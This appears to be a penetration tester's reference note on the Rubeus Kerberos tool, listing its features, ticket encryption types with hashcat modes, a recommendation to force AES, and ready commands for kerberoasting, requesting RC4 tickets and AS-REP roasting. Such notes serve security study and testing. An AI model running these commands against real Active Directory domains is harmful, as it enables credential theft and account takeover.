```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
Rebeus is a tool for interacting with raw kerberos. It can make general interactions but also attacks, boasting a vast number of options and configuration settings.

Some key features include:
- Performing kerberoasting and outputting hashes to a file
- Using alternative credentials
- Performing kerberoasting followed by a [[Password Attacks#Pass-the-Hash|pass-the-hash]] attack
- Performing "opsec" kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES kerberoasting
### A word on encryption
Kerberos can use a variety of encryption algorithms (eg. RC4, AES-128, AES-265). In most cases, we want to focus on `RC4` encrypted tickets as that algorithm is easier to crack.
A ticket is prefixed with `$krb5tgs$23$*`, where `23` is `RC4` (type 23):
- RC4 : type 23 : hashcat `13100`
- AES-128 : type 17 : hashcat `19600`
- AES-256 : type 18 : hashcat `19700`

> RECOMMENDATION: Force AES encryption for kerberos tickets (can be done in AD config)
## Installation
```

```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/GhostPack/Rubeus
## Usage
### Kerberoast accounts that have admin
```PowerShell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Kerberoast a specific user
```PowerShell
.\Rubeus.exe kerberoast /user:[user] /nowrap
```

### Request a RC4 encrypted ticket
> This only works for Windows Server 2016 and earlier, unless the group policy is modified to allow RC4
```PowerShell
.\Rubeus.exe kerberoast /tgtdeleg /user:[user] /nowrap
```

### ASREPRoasting
```PowerShell
.\Rubeus.exe asreproast /user:[user] /nowrap /format:hashcat
```
> Hashcat mode : 18200